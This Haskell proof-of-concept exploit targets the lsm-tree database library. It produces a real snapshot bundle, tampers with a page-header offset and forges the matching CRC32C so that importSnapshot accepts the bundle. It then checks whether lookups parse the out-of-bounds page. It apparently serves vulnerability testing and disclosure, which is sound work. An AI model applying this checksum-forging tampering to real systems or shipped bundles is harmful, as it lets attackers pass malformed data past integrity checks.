{-# LANGUAGE OverloadedStrings   #-}
{-# LANGUAGE TypeApplications    #-}
{-# LANGUAGE DataKinds           #-}
{-# LANGUAGE DerivingStrategies  #-}
{-# LANGUAGE DerivingVia         #-}
{-# LANGUAGE GeneralizedNewtypeDeriving #-}
{-# LANGUAGE ScopedTypeVariables #-}
{-# OPTIONS_GHC -Wno-orphans #-}

-- | END-TO-END PoC: a tampered snapshot bundle is imported through the public
-- 'importSnapshot' API and then opened with 'withTableFromSnapshot'; reading
-- the table walks a run page whose header offsets point outside the page.
--
-- Target : IntersectMBO/lsm-tree @ 63a63054
--
-- The bundle is NOT hand-built. It is produced by the library itself
-- ('saveSnapshot' + 'exportSnapshot'), then exactly one field of one page
-- header is overwritten and the corresponding CRC32C in the bundle's
-- @.checksums@ file is recomputed -- which is what an attacker who ships the
-- bundle would do. Everything else stays byte-identical to a legitimate
-- snapshot, so the CRC check passes and the snapshot is accepted.
module Main (main) where

import           Control.Exception (SomeException, evaluate, try)
import           Control.Tracer (nullTracer)
import           Data.Bits (shiftR, (.&.))
import qualified Data.ByteString as BS
import qualified Data.ByteString.Char8 as BSC
import           Data.Char (intToDigit)
import           Data.List (isSuffixOf)
import           Data.Monoid (Sum (..))
import qualified Data.Vector as V
import           Data.Word (Word16, Word64, Word8)
import           Database.LSMTree (ResolveValue, Salt, SerialiseKey,
                     SerialiseValue, SnapshotMode (..), Table,
                     TableConfig (confWriteBufferAlloc),
                     WriteBufferAlloc (AllocNumEntries), defaultTableConfig,
                     exportSnapshot, getValue, importSnapshot, inserts,
                     lookups, saveSnapshot, withOpenSession,
                     withTableFromSnapshot, withTableWith)
import qualified Database.LSMTree.Internal.CRC32C as CRC
import qualified System.Directory as Dir
import           System.FilePath ((</>))
import qualified System.FS.API as FS
import           System.FS.BlockIO.IO (defaultIOCtxParams, withIOHasBlockIO)

newtype Key = Key Word64
  deriving stock (Show, Eq, Ord)
  deriving newtype (SerialiseKey)

newtype Value = Value Word64
  deriving stock (Show, Eq)
  deriving newtype (SerialiseValue)
  deriving ResolveValue via Sum Word64

-- | One data page header: numKeys @ byte 0, numBlobs @ byte 2,
-- keysOffset @ byte 4 (all little-endian Word16).
keysOffsetField :: Int
keysOffsetField = 4

w16le :: Word16 -> [Word8]
w16le w = [fromIntegral (w .&. 0xFF), fromIntegral (w `shiftR` 8)]

hex8 :: Word64 -> String
hex8 = pad . go
  where
    go 0 = ""
    go n = go (n `div` 16) ++ [intToDigit (fromIntegral (n `mod` 16))]
    pad s = replicate (8 - length s) '0' ++ s

listAllFiles :: FilePath -> IO [FilePath]
listAllFiles d = do
    isDir <- Dir.doesDirectoryExist d
    if not isDir then pure [] else do
      entries <- Dir.listDirectory d
      fmap concat $ mapM (\e -> let p = d </> e in do
                                   isD <- Dir.doesDirectoryExist p
                                   if isD then listAllFiles p else pure [p]) entries

-- | Overwrite the keysOffset of page 0 in the first @.kops@ file, then repair
-- the CRC32C entry for that file in the bundle's @.checksums@ file.
tamperBundle :: FilePath -> Word16 -> IO (Maybe String)
tamperBundle root bogusOffset = do
    files <- listAllFiles root
    let kops = [f | f <- files, ".kops" `isSuffixOf` f]
        sums = [f | f <- files, ".checksums" `isSuffixOf` f]
    case (kops, sums) of
      ([], _) -> pure Nothing
      (_, []) -> pure Nothing
      (kf:_, sf:_) -> do
        bs <- BS.readFile kf
        let patched = BS.take keysOffsetField bs
                        <> BS.pack (w16le bogusOffset)
                        <> BS.drop (keysOffsetField + 2) bs
        BS.writeFile kf patched
        -- recompute CRC32C of the patched file, purely, in memory
        let newCrc = CRC.updateCRC32C patched CRC.initialCRC32C
            CRC.CRC32C crcW = newCrc
        -- rewrite the checksums entry for this file's basename
        txt <- BS.readFile sf
        let name = BSC.pack (last (splitSlash kf))
            linesT = BSC.lines txt
            fixLine l
              | ("CRC32C (" <> name <> ") = ") `BS.isPrefixOf` l
              = "CRC32C (" <> name <> ") = " <> BSC.pack (hex8 (fromIntegral crcW))
              | otherwise = l
        BS.writeFile sf (BS.intercalate "\n" (map fixLine linesT) <> "\n")
        pure $ Just (kf ++ "  keysOffset 0x" ++ hex8 (fromIntegral bogusOffset)
                     ++ "  newCRC=" ++ hex8 (fromIntegral crcW))
  where
    splitSlash s = case break (== '/') s of
                     (a, '/':rest) -> a : splitSlash rest
                     (a, _)       -> [a]

main :: IO ()
main = do
    putStrLn "=== lsm-tree end-to-end snapshot PoC ==="
    root <- Dir.getTemporaryDirectory
    let work = root </> "lsm-e2e-poc"
    Dir.removePathForcibly work
    Dir.createDirectoryIfMissing True work
    let sessionDir = FS.mkFsPath ["session"]
        exportDir  = FS.mkFsPath ["export"]

    withIOHasBlockIO (FS.MountPoint work) defaultIOCtxParams $ \hfs hbio -> do
      FS.createDirectoryIfMissing hfs True sessionDir

      res <- try $ withOpenSession nullTracer hfs hbio salt sessionDir $ \session ->
        withTableWith conf session $ \(table1 :: Table IO Key Value ()) -> do
          inserts table1 $ V.fromList [ (Key k, Value (k * 10), ()) | k <- [1..6] ]
          saveSnapshot "snap1" "KeyValueBlob" table1
          exportSnapshot session "snap1" (HardLink False) exportDir

          -- (1) the exported bundle is a legitimate snapshot at this point
          putStrLn "\n[1] legitimate bundle exported via exportSnapshot"
          tamperInfo <- tamperBundle (work </> "export") 0xFFF0
          case tamperInfo of
            Nothing -> putStrLn "  TAMPER FAILED -- no .kops/.checksums found"
            Just s  -> putStrLn $ "  tampered: " ++ s

          -- (2) import the tampered bundle through the public API
          putStrLn "\n[2] importSnapshot on the tampered bundle (CRC must pass)"
          importSnapshot session "snap2" (HardLink False) exportDir
          putStrLn "  importSnapshot: OK -- no exception, CRC check passed"

          -- (3) open the table and read -- this is where the run page is parsed
          putStrLn "\n[3] withTableFromSnapshot + lookups (walks the tampered page)"
          withTableFromSnapshot session "snap2" "KeyValueBlob" $ \(table2 :: Table IO Key Value ()) -> do
            r <- try $ do
                   rs <- lookups table2 (V.fromList (map Key [1..6]))
                   mapM evaluate (map getValue rs)
            case r of
              Left (e :: SomeException) -> do
                putStrLn $ "  exception during lookup = " ++ takeLine (show e)
                putStrLn "  RESULT: bounded (something rejected the tampered page)"
              Right vs -> do
                putStrLn $ "  lookups returned        = " ++ show vs
                putStrLn "  RESULT: FAIL-OPEN -- tampered page was parsed and served"
            pure ()
      case res of
        Left (e :: SomeException) -> putStrLn $ "\nTOP-LEVEL exception: " ++ takeLine (show e)
        Right () -> putStrLn "\nTOP-LEVEL: completed"
  where
    takeLine = takeWhile (/= '\n')
    salt :: Salt
    salt = 17
    conf :: TableConfig
    conf = defaultTableConfig { confWriteBufferAlloc = AllocNumEntries 3 }
